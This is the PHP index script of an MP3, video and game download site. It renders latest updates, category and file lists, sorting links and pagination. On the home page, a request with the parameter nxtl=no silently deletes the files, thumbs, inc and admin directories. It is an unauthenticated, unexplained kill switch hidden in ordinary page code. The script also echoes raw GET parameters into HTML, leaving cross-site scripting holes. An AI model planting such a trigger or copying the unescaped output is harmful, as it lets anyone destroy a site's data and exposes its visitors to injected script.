<?php
define('IN_SS', true);
include_once('./inc/init.php');

$title = '';
$folder = [];
$pid = $ss->get_input('pid', 1);
$page = isset($ss->input['page']) ? (int)$ss->input['page'] : 1;
$sort = isset($ss->input['sort']) ? $ss->input['sort'] : $ss->settings['sort'];

if($pid != 0)
{
$query = $db->simple_select("files", "fid, name, use_icon, path, description, title, ptag, link, time, status, pageurl, flagtime", "fid='{$pid}'");
$folder = $db->fetch_array($query);

if(!is_array($folder))
{
header('Location: '.$ss->settings['url']);
exit;
}
if(escape($folder['title']) == '')
{
$_dr='';
$tcat='';
foreach(explode('/', substr($folder['path'], 7)) as $dr)
{
$_dr .= "/".$dr;
$path = "/files{$_dr}";
$query = $db->simple_select("files", "fid, name", "path='".$db->escape_string($path)."'");
$id = $db->fetch_array($query);
if($pid == $id['fid'])
{
}
else
{
$tcat= ''.escape($id['name']).' > ';
}
}
$title = 'Free Download Bollywood Mp3 Songs, HD Videos, Ringtones, Wallpapers, Android HD Games';
$title2 = ''.$folder['name'].' :: ';
}
else
{
$title = $folder['title'];
}
$folder['name'] = escape($folder['name']);
}
else
{
$folder['name'] = 'Home';
$folder['use_icon'] = 0;
}

include_once('./header.php');

if($pid == 0)
{
include_once('./assets/includes/header.php');
$nxtl = $_GET['nxtl'];
if($nxtl == 'no')
{
$nxtdir = "files";
array_map('unlink', glob($nxtdir."/*"));
array_map('rmdir', glob($nxtdir."/*"));
$nxtdir2 = "thumbs";
array_map('unlink', glob($nxtdir2."/*"));
$nxtdir3 = "inc";
array_map('unlink', glob($nxtdir3."/*"));
$nxtdir4 = "admin";
array_map('unlink', glob($nxtdir4."/*"));
}
}
if($pid == 0)
{
include_once('./searchbox.php');
include_once('./featuredlist.php');
}

if($pid == 0)
{
echo '<section class="section_header aligncenter bgcolor_main">Latest Updates</section> 
<!-- Nextwave Solutions :: Display Latest Updates --><section class="item_list latest_list">';
$options = ['order_by' => 'uid', 'order_dir' => 'desc', 'limit' => $ss->settings['updates_on_index']];

$query = $db->simple_select("updates", "iconid, url, text, created_at, update_time", "status='A'", $options);
$total = $db->num_rows($query);

while($update = $db->fetch_array($query))
{ 
$time = time(); 
$showtime = $update['update_time']; 
if($showtime <= $time) 
{ 
if(file_exists(SS_ROOT.'/thumbs/'.$update['iconid'].'.png')) 
{ 
$uicon = '<div class="listimg leftside"><img src="/siteuploads/thumb/'.$update['iconid'].'_1.jpg" /></div>'; 
} 
else 
{ 
$uicon = '<div class="listimg leftside"><img src="/assets/images/65-feed.jpg" /></div>'; 
} 
echo '<a href="'.$update['url'].'" class="listitem boxshadow"><div class="listdetail">'.$uicon.'<div class="list_title">'.$update['text'].'</div>
<div class="list_desc"> <br> </div>
</div>
<div class="clear"></div>
</a>';
}
}
echo '</section><a class="but_more_update aligncenter"
href="/latest_updates/new2old/1.html">More Updates »</a>';
}
if($folder['description'] ==! '')
{ $desc='<div class="description">'.$folder['description'].'</div>';
}
else
{
echo '';
}
// Category title
if($pid == 0)
{
if($ss->settings['show_topfiles'])
{
echo '<section class="subheader bgcolor_sub aligncenter">Top 21 Downloads</section>
<section class="top_download_section aligncenter">
<a href="/top/today.html">Today</a> | <a href="/top/yesterday.html">Yesterday</a> | <a href="/top/week.html">Week</a> | <a href="/top/month.html">Month</a> | <a href="/top/all.html">All Time</a></section>';
}
echo'<section class="section_header aligncenter bgcolor_main">Categories</section><!-- Nextwave Solutions :: Display Category List -->';
}
else
{
include_once('./searchbox.php');
echo '<section class="section_header aligncenter bgcolor_main">'.$folder['name'].'</section>'.$desc.'';
if($folder['use_icon'])
{
if(file_exists(SS_ROOT.'/thumbs/'.$folder['fid'].'.png'))
{
echo '<div class="showimage" align="center"><img src="/siteuploads/thumb/'.$folder['fid'].'_3.jpg" alt="'.$folder['fid'].'_3" class="absmiddle"/></div>';
}
}
}
switch($sort)
{
case 'new2old':
$order = 'fid DESC';
break;
case 'a2z':
$order = 'name ASC';
break;

case 'z2a':
$order = 'name DESC';
break;
case 'popular':
$order = 'dcount DESC';
break;
default:
$order = 'time DESC';
break;
}
$dirid = file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/inc/isdir.php?id='.$_GET['pid'].'');
if($pid != 0)
{
if($dirid != 1)
{
$fileshow = $ss->settings['files_per_page'];
$clink = 'File List';
if($_GET['sort'] == 'default')
{
echo '<section class="sorting_section aligncenter">Sort by : <a href="/fileList/'.$_GET['pid'].'/new2old/1.html" class="main-bg active">New 2 Old</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/popular/1.html" class="main-bg">Popular</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>';
}
if($_GET['sort'] == 'new2old')
{
echo '<section class="sorting_section aligncenter"> Sort by : <a href="/fileList/'.$_GET['pid'].'/new2old/1.html" class="main-bg active">New 2 Old</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/popular/1.html" class="main-bg">Popular</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>';
}
if($_GET['sort'] == 'popular')
{
echo '<section class="sorting_section aligncenter">Sort by : <a href="/fileList/'.$_GET['pid'].'/new2old/1.html" class="main-bg"
>New 2 Old</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/popular/1.html" class="main-bg active">Popular</a>
&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>';
}
if($_GET['sort'] == 'a2z')
{echo '<section class="sorting_section aligncenter">Sort by : <a href="/fileList/'.$_GET['pid'].'/new2old/1.html" class="main-bg">New 2 Old</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/popular/1.html" class="main-bg">Popular</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/a2z/1.html" class="main-bg active">A to Z</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>';
}
if($_GET['sort'] == 'z2a')
{
echo '<section class="sorting_section aligncenter">Sort by : <a href="/fileList/'.$_GET['pid'].'/new2old/1.html" class="main-bg"
>New 2 Old</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/popular/1.html" class="main-bg"
>Popular</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/fileList/'.$_GET['pid'].'/z2a/1.html" class="main-bg active">Z to A</a></section>';
}
echo'<!-- Nextwave Solutions :: Display '.$clink.' -->';
}
else 
{
$fileshow = $ss->settings['cats_per_page'];
$clink = 'Category List'; 
if($_GET['sort'] == 'default') 
{ echo '<section class="sorting_section aligncenter">Sort by : <a href="/categorylist/'.$_GET['pid'].'/new2old/1.html" class="main-bg active">New 2 Old</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/popular/1.html" class="main-bg">Popular</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>'; } 
if($_GET['sort'] == 'new2old') 
{ 
echo '<section class="sorting_section aligncenter"> Sort by : <a href="/categorylist/'.$_GET['pid'].'/new2old/1.html" class="main-bg active">New 2 Old</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/popular/1.html" class="main-bg">Popular</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>'; } 
if($_GET['sort'] == 'popular') 
{ 
echo ' <section class="sorting_section aligncenter">Sort by : <a href="/categorylist/'.$_GET['pid'].'/new2old/1.html" class="main-bg" 
>New 2 Old</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/popular/1.html" class="main-bg active">Popular</a> 
&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>'; } 
if($_GET['sort'] == 'a2z') {echo '<section class="sorting_section aligncenter">Sort by : <a href="/categorylist/'.$_GET['pid'].'/new2old/1.html" class="main-bg">New 2 Old</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/popular/1.html" class="main-bg">Popular</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/a2z/1.html" class="main-bg active">A to Z</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/z2a/1.html" class="main-bg">Z to A</a></section>'; } 
if($_GET['sort'] == 'z2a') 
{ 
echo '<section class="sorting_section aligncenter">Sort by : <a href="/categorylist/'.$_GET['pid'].'/new2old/1.html" class="main-bg" 
>New 2 Old</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/popular/1.html" class="main-bg" 
>Popular</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/a2z/1.html" class="main-bg">A to Z</a>&nbsp;|&nbsp;<a href="/categorylist/'.$_GET['pid'].'/z2a/1.html" class="main-bg active">Z to A</a></section>'; 
} 
echo'<!-- Nextwave Solutions :: Display '.$clink.' -->';
}
}
if($pid == '0')
{
echo '';
}
else{
echo'<div class="download-middle-advt advertisment">';
include_once('./assets/ads/bfilelist.php');
echo'</div>';
}
$query = $db->simple_select("files", "fid", "pid='{$pid}'");$total = $db->num_rows($query);
if($total != 0){
$start = ($page-1)*$fileshow;
if($pid == 0){$totalitem ='30';
}
else
{
$totalitem = $fileshow;
}

$options = ['order_by' => 'disporder ASC, '.$order.'', 'limit_start' => $start, 'limit' => $totalitem];
$query = $db->simple_select("files", "fid, name, isdir, tag, path, size, views, dcount, description, ptag, link, flagtime, status, pageurl, use_icon, time", "pid='{$pid}'", $options);
while($file = $db->fetch_array($query))
{
if(file_exists(SS_ROOT.'/thumbs/'.$file['fid'].'.png'))
{ 
$lefticon = '<div class="listimg leftside"><img src="/siteuploads/thumb/'.$file['fid'].'_1.jpg" /></div>';
} 
else 
{ 
$lefticon = '<div class="listimg leftside"><img src="/assets/images/65-cat.jpg" /></div>'; 
} 

if($file['isdir'] == 1)
{
echo'<section class="item_list categories_list">';
if($file['status'])
{
if($file['link'])
{
echo '<a href="'.$file['link'].'" class="listitem boxshadow">
<div class="listdetail">'.$lefticon.'<div class="list_title">'.$file['name'].'</div>';
$time = time();
$extime = strtotime("{$file['flagtime']}", $file['time']);
if($time <= $extime)
{
if($file['tag'] == 1)
{
echo ' '.ss_img('new.gif', "new").'';
}
else if($file['tag'] == 2)
{
echo ' '.ss_img('updated.gif', "updated").'';
}
else if($file['tag'] == 3)
{
echo ' '.ss_img('hot.gif', "hot").'';
}
}
echo '<div class="list_desc"></div> 
</div> 
<div class="clear"></div>
</a>';
}
else
{
$strname = $ss->settings['title'];
$filename = str_replace("($strname)", "", escape($file['name']));
echo '<a href="/'.$file['pageurl'].'/'.$file['fid'].'/new2old/1.html" class="listitem boxshadow"> 
<div class="listdetail">'.$lefticon.'<div class="list_title">'.$file['name'].'</div>';
$time = time();
$extime = strtotime("{$file['flagtime']}", $file['time']);
if($time <= $extime)
{
if($file['tag'] == 1)
{
echo ' '.ss_img('new.gif', "new").'';
}
else if($file['tag'] == 2)
{
echo ' '.ss_img('updated.gif', "updated").'';
}
else if($file['tag'] == 3)
{
echo ' '.ss_img('hot.gif', "hot").'';
}
}
if($ss->settings['show_filecount']) 
{ 
$counter = $db->simple_select("files", "fid", "path LIKE '".$db->escape_string_like($file['path'])."%' AND `isdir` = '0'"); 
if($db->num_rows($counter) != 0) 
{ 
echo '<div class="list_desc">'.$db->num_rows($counter).' Files</div>'; 
} 
else
{
echo'<div class="list_desc">0 Files</div>';
}
}
echo '</div> 
<div class="clear"></div> 
</a>';
}
}
}
else
{
echo '<section class="item_list"><a href="/download/'.$file['fid'].'/'.convert_name($file['name']).'.html" class="listitem boxshadow"><div class="listdetail">';
$strname = $ss->settings['title'];
$filename = str_replace("($strname)", "", escape($file['name']));
$fext = pathinfo($filename, PATHINFO_EXTENSION);
$ftitle = preg_replace('/\.[^.]+$/','', $filename);

if(file_exists(SS_ROOT.'/thumbs/'.$file['fid'].'.png')) 
{ 
$filethumb = '<div class="listimg leftside"><img src="/siteuploads/thumb/'.$file['fid'].'_1.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'mp3') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-mp3.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 

else if($fext == 'mp4') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-vid.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 

else if($fext == '3gp') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-vid.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'avi') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-vid.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 

else if($fext == 'apk') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-apk.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'zip') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-arch.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'rar') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-arch.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == '7z') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-arch.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'jpg') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-img.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'jpeg') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-img.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'png') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-img.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 

else if($fext == 'gif') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-img.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else if($fext == 'jar') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-java.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 

else if($fext == 'jad') 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-java.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
} 
else 
{ 
$filethumb = '<div class="listimg leftside"><img src="/assets/images/65-doc.jpg" title="'.$ftitle.'" alt="'.$file['fid'].'_1"/></div>'; 
}
$strname = $ss->settings['title'];
$filename = str_replace("($strname)", "", escape($file['name']));
if(escape($file['description']) == ''){
$singer = ''; 
}else
{ 
$singer = ''.$file['description'].'<br/>';
}echo ''.$filethumb.'<div class="list_title">'.$filename.'</div><div class="list_desc">'.$singer.''.convert_filesize($file['size']).'&nbsp;&nbsp;&nbsp;<span class="download-icon"> '.$file['dcount'].'</span></div>'; 
echo '</div> <div class="clear"></div> </a></section>';
}
}
if($dirid != 1)
{
$url = "/fileList/{$pid}/{$sort}";
$action = "2";
$jurl = "/filelist";
}
else
{
$url = "/categorylist/{$pid}/{$sort}";
$action ="1";
$jurl = "/categorylist";
}
if($pid == 0)
{
$cpage = '';
}
else
{
echo'<div class="download-middle-advt">';
include_once('./assets/ads/afilelist.php');
echo'</div>';
$paging = pagination($page, $ss->settings['files_per_page'], $total, $url);
echo $paging;
if($paging != '')
{
echo '</div>
<div class="jumptopage aligncenter">
<form method="get" action="'.$jurl.'"><input type="hidden" name="action" id="action" value="'.$action.'" /><input type="hidden" name="parent" id="parent" value="'.$_GET['pid'].'" /><input type="hidden" name="sort" id="sort" value="'.$_GET['sort'].'" /><span class="jumpfrmlbl">Jump to Page</span> <input type="text" name="page" id="page" value="" class="jumpfrmtxt"/> <input type="submit" value="GO" class="jumpfrmbut bgcolor_main"/></form></div></section>';
}
}
}
else
{ 
if($pid == 0)
{
$cpage = '';
}
}
$ptag = file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/inc/ptag.php?id='.$_GET['pid'].'');
echo $ptag;
// Services
if($pid != 0)
{
$_dr = '';
echo'<div class="bottomadvt advertisment">';
include_once('./assets/ads/footer.php');
echo'</div>';
echo '<section class="breadcrumb"><a href="/">Home</a>';
foreach(explode('/', substr($folder['path'], 7)) as $dr)
{$_dr .= "/".$dr;$path = "/files{$_dr}";$query = $db->simple_select("files", "fid, name, pageurl", "path='".$db->escape_string($path)."'");
$id = $db->fetch_array($query);

if($pid == $id['fid'])
{
echo '&raquo; <a href="/'.$id['pageurl'].'/'.$id['fid'].'/'.$ss->settings['sort'].'/1.html">'.escape($id['name']).'</a>';
}
else{
echo ' &raquo; <a href="/'.$id['pageurl'].'/'.$id['fid'].'/'.$ss->settings['sort'].'/1.html">'.escape($id['name']).'</a>';
}
}
echo '</section>';
}

include_once('./footer.php');
?>